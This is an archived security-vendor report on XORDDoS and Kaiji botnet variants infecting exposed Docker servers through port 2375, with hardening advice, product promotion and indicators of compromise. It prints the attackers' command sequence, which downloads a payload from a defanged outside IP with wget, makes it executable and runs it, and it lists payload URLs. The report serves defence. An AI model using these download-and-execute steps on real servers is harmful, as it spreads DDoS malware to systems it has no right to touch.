{
    "id": "aa3ec25b-f671-46a0-b49e-26d65d46b072",
    "created_at": "2023-01-12T15:03:46.068328Z",
    "updated_at": "2025-03-27T02:05:43.857515Z",
    "deleted_at": null,
    "sha1_hash": "25027e49334e689e19b63724d97ca606f2d58f49",
    "title": "2020-06-22 - XORDDoS, Kaiji Botnet Malware Variants Target Exposed Docker Servers",
    "authors": "",
    "file_creation_date": "2022-05-28T03:08:27Z",
    "file_modification_date": "2022-05-28T03:08:27Z",
    "file_size": 187517,
    "plain_text": "# XORDDoS, Kaiji Variants Target Exposed Docker Servers\n\n**[blog.trendmicro.com/trendlabs-security-intelligence/xorddos-kaiji-botnet-malware-variants-target-exposed-docker-servers/](https://blog.trendmicro.com/trendlabs-security-intelligence/xorddos-kaiji-botnet-malware-variants-target-exposed-docker-servers/)**\n\nJune 22, 2020\n\nWe have recently detected variants of two existing Linux botnet malware types targeting exposed Docker\n[servers; these are XORDDoS malware (detected by Trend Micro as Backdoor.Linux.XORDDOS.AE) and Kaiji](http://www.trendmicro.com/vinfo/tmr/?/us/threat-encyclopedia/malware/Backdoor.Linux.XORDDOS.AE)\n[DDoS malware (detected by Trend Micro as DDoS.Linux.KAIJI.A).](http://www.trendmicro.com/vinfo/tmr/?/us/threat-encyclopedia/malware/DDoS.Linux.KAIJI.A)\n\nHaving Docker servers as their target is a new development for both XORDDoS and Kaiji; XORDDoS was\n[known for targeting Linux hosts on cloud systems, while recently discovered Kaiji was first reported to affect](https://www.intezer.com/blog/research/kaiji-new-chinese-linux-malware-turning-to-golang/)\n[internet of things (IoT) devices. Attackers usually used botnets to perform brute-force attacks after scanning for](https://www.trendmicro.com/vinfo/tmr/?/us/security/definition/internet-of-things)\nopen Secure Shell (SSH) and Telnet ports. Now, they also searched for Docker servers with exposed ports\n(2375). Port 2375, one of the two ports Docker API uses, is for unencrypted and unauthenticated\ncommunication.\n\nThere is, however, a notable difference between the two malware variants’ method of attack. While the\nXORDDoS attack infiltrated the Docker server to infect all the containers hosted on it, the Kaiji attack deploys\nits own container that will house its DDoS malware.\n\n[These malware variants facilitate distributed denial of service (DDoS), a type of attack designed to disable,](https://www.trendmicro.com/vinfo/tmr/?/us/security/definition/denial-of-service-dos#:~:text=Denial%20of%20service%20(DoS)%20is,a%20network%2C%20website%20or%20service.&text=When%20a%20DoS%20attack%20is,of%20service%20attack%20(DDoS).)\ndisrupt, or shut down a network, website, or service. This is done by using multiple systems to overwhelm the\ntarget system with traffic until it becomes inaccessible to other users.\n\n## Analysis of XORDDoS malware\n\nThe XORDDoS infection started with the attackers searching for hosts with exposed Docker API ports (2375).\nThey then sent a command that listed the containers hosted on the Docker server. Afterwards, the attackers\nexecuted the following sequence of commands to all containers, infecting all of them with the XORDDoS\nmalware:\n\nwget hxxp://122[.]51[.]133[.]49:10086/VIP –O VIP\n\nchmod 777 VIP\n\n\n-----\n\n./VIP\n\nThe XORDDoS payload (detected by Trend Micro as [Backdoor.Linux.XORDDOS.AE) still used the XOR-key it](http://www.trendmicro.com/vinfo/tmr/?/us/threat-encyclopedia/malware/Backdoor.Linux.XORDDOS.AE)\nused in other recorded attacks, BB2FA36AAA9541F0, to encrypt its strings and to communicate with the\ncommand and control (C&C) server. It also created multiple copies of itself inside the machine as a persistence\nmechanism.\n\nFigure 1. Code snippet showing XORDDoS creating multiple copies of itself\n\nThe payload initiated SYN, ACK, and DNS types of DDoS attacks.\n\nFigure 2. Code snippet showing the types of DDoS attack that XORDDoS can launch\n\nIt is also capable of downloading and executing a follow-up malware, or updating itself.\n\nFigure 3. Code snippet showing XORDDoS’ capability to download and update files.\n\nIt gathered the following data, which are relevant to its attempt to initiate a DDoS attack:\n\nCPU Information\nMD5 of Running Process\nMemory Information\nNetwork Speed\nPID of Running Process\n\nIt should be noted that most of the behaviors exhibited by this particular XORDDoS variant have already been\nobserved in earlier variants of the malware.\n\nUpon further investigation of the URL linked to the attacker, we found other malware such as\n[Backdoor.Linux.DOFLOO.AB, a variant of Dofloo/AESDDoS Linux botnet malware that we witnessed targeting](https://www.trendmicro.com/vinfo/tmr/?/us/threat-encyclopedia/malware/Backdoor.Linux.DOFLOO.AB)\n[exposed Docker APIs previously.](https://blog.trendmicro.com/en_us/research/19/f/aesddos-botnet-malware-infiltrates-containers-via-exposed-docker-apis.html)\n\n## Analysis of Kaiji malware\n\nSimilar with the XORDDoS malware, Kaiji is now also targeting exposed Docker servers for propagation. Its\noperator also scanned the internet for hosts with exposed port 2375. After finding a target, they pinged the\nDocker server before deploying a rogue ARM container that executed the Kaiji binary.\n\n[The script 123.sh (detected by Trend Micro as Trojan.SH.KAIJI.A) downloaded and executed the malware](http://www.trendmicro.com/vinfo/tmr/?/us/threat-encyclopedia/malware/Trojan.SH.KAIJI.A)\npayload, linux_arm (detected by Trend Micro as [DDoS.Linux.KAIJI.A). Afterwards, the script also removed](http://www.trendmicro.com/vinfo/tmr/?/us/threat-encyclopedia/malware/DDoS.Linux.KAIJI.A)\nother Linux binaries that are basic components of the operating system but are not necessary for its DDoS\noperation.\n\nFigure 4. Query that downloads and executes 123.sh\n\n[Figure 5. Code snippet showing the removal of Linux binaries](https://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/trendlabs-security-intelligence-07/files/2020/06/Figure-5.-Code-snippet-showing-the-removal-of-Linux-binaries.jpg)\n\nFigure 5. Code snippet showing the removal of Linux binaries\n\n\n-----\n\nThe payload linux_arm, which is the Kaiji DDoS malware, initiated the following DDoS attacks:\n\nACK attack\nIPS spoof attack\nSSH attack\nSYN attack\nSYNACK attack\nTCP flood attack\nUDP flood attack\n\nThis malware also gathered the following data, which it can use for the aforementioned attacks:\n\nCPU Information\nDirectories\nDomain Name\nHost IP address\nPID of Running Process\nURL scheme\n\n## Defending Docker servers\n\nAs seen in these findings, threat actors behind malware variants constantly upgrade their creations with new\ncapabilities so that they can deploy their attacks against other entry points. As they are relatively convenient to\ndeploy in the cloud, Docker servers are becoming an increasingly popular option for companies. However,\nthese also make them an attractive target for cybercriminals who are on the constant lookout for systems that\nthey can exploit.\n\nThese are some [recommendations for securing Docker servers:](https://www.trendmicro.com/vinfo/tmr/?/us/security/news/security-technology/container-security-in-six-steps)\n\nSecure the container host. Take advantage of monitoring tools, and host containers in a containerfocused OS.\nSecure the networking environment. Use intrusion prevention system (IPS) and web filtering to provide\nvisibility and observe internal and external traffic.\nSecure the management stack. Monitor and secure the container registry and lock down the Kubernetes\ninstallation.\nSecure the build pipeline. Implement a thorough and consistent access control scheme and install strong\nendpoint controls.\n[Adhere to the recommended best practices.](https://docs.docker.com/engine/security/security/)\nUse security tools to scan and secure containers.\n\n[Security solutions are recommended for safeguarding Docker servers. Trend Micro™ Hybrid Cloud Security is](https://blog.trendmicro.com/en_us/business/products/hybrid-cloud.html)\nrecommended for automated security and protection for physical, virtual, and cloud workloads. This solution\nencompasses the following:\n\n[Trend Micro Cloud One™– for comprehensive visibility and protection against threats](https://blog.trendmicro.com/en_us/business/products/hybrid-cloud/cloud-one-workload-security.html)\n[Trend Micro Cloud One - Container Security– for automated container image and registry scanning that](https://blog.trendmicro.com/en_us/business/products/hybrid-cloud/cloud-one-container-image-security.html)\nhelps detect threats early on\n[Trend Micro Cloud One – Workload Security – for protecting new and existing workloads against even](https://blog.trendmicro.com/en_us/business/products/hybrid-cloud/cloud-one-workload-security.html)\nunknown threats using techniques such as machine learning and virtual patching\nFor security as software: [Trend Micro Deep Security™ Software (workload and container security)](https://blog.trendmicro.com/en_us/business/products/hybrid-cloud/deep-security.html)\n[and Trend Micro Deep Security Smart Check (container image security) for scanning container images](https://blog.trendmicro.com/en_us/business/products/hybrid-cloud/smart-check-image-scanning.html)\nand preventing further compromise\n\n\n-----\n\n## Indicators of Compromise\n\n**Kaiji**\n\n\n**File**\n**name**\n\n\n**SHA 256** **Trend Micro**\n**pattern detection**\n\n\n123.sh 9301d983e9d8fad3cc205ad67746cd111024daeb4f597a77934c7cfc1328c3d8 [Trojan.SH.KAIJI.A](http://www.trendmicro.com/vinfo/tmr/?/us/threat-encyclopedia/malware/Trojan.SH.KAIJI.A)\n\nlinux_arm d315b83e772dfddbd2783f016c38f021225745eb43c06bbdfd92364f68fa4c56 [DDoS.Linux.KAIJI.A](http://www.trendmicro.com/vinfo/tmr/?/us/threat-encyclopedia/malware/DDoS.Linux.KAIJI.A)\n\n**Related URLs:**\n\nhxxp://62[.]171[.]160[.]189/linux_arm\nhxxp://62[.]171[.]160[.]189/11/123.sh\n\n**XORDDoS and other malware variants found through the same URL**\n\n**SHA 256** **Trend Micro pattern**\n**detection**\n\ndba757c20fbc1d81566ef2877a9bfca9b3ddb84b9f04c0ca5ae668b7f40ea8c3 [Backdoor.Linux.XORDDOS.AE](http://www.trendmicro.com/vinfo/tmr/?/us/threat-encyclopedia/malware/Backdoor.Linux.XORDDOS.AE)\n\n6c8f95b82592ac08a03bfe32e4a4dbe637d1f542eb3ab3054042cec8ec301a3c [Backdoor.Linux.DOFLOO.AB](http://www.trendmicro.com/vinfo/tmr/?/us/threat-encyclopedia/malware/Backdoor.Linux.DOFLOO.AB)\n\n286f774eb5b4f2f7c62d5e68f02a37b674cca7b8c861e189f1f596789322f9fe [Backdoor.Win32.SDDOS.A](http://www.trendmicro.com/vinfo/tmr/?/us/threat-encyclopedia/malware/Backdoor.Win32.SDDOS.A)\n\n**Related URL:**\n\nhxxp://122[.]51[.]133[.]49:10086/VIP\n\nCloud\n\nWe detected variants of two Linux botnet malware - XORDDoS and Kaiji - targeting exposed Docker servers.\nXORDDoS infiltrated the Docker server to infect all containers it hosts, while the Kaiji attack used its own\ncontainer with its DDoS malware.\n\nBy: Augusto Remillano II, Patrick Noel Collado, Karen Ivy Titiwa June 22, 2020 Read time: ( words)\n\nContent added to Folio\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-06-22 - XORDDoS, Kaiji Botnet Malware Variants Target Exposed Docker Servers.pdf"
    ],
    "report_names": [
        "2020-06-22 - XORDDoS, Kaiji Botnet Malware Variants Target Exposed Docker Servers.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535826,
    "ts_updated_at": 1743041143,
    "ts_creation_date": 1653707307,
    "ts_modification_date": 1653707307,
    "files": {
        "pdf": "https://archive.orkl.eu/25027e49334e689e19b63724d97ca606f2d58f49.pdf",
        "text": "https://archive.orkl.eu/25027e49334e689e19b63724d97ca606f2d58f49.txt",
        "img": "https://archive.orkl.eu/25027e49334e689e19b63724d97ca606f2d58f49.jpg"
    }
}